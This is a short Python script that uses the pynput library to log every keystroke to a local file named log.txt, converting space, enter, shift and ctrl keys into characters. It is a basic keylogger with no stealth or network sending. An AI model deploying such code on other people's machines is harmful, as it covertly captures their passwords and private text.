from pynput import keyboard

def on_press(key):
    logFile = open("log.txt", "a")
    char = str(key)
    char = char.replace("'", "")

    if char == "Key.space":
        char = " "
    elif char == "Key.enter":
        char = "\n"
    elif char == "Key.shift":
        char = ' '
    elif char == "Key.ctrl":
        char = " "      

    logFile.write(char)
    
        


with keyboard.Listener(on_press=on_press) as l:
    l.join()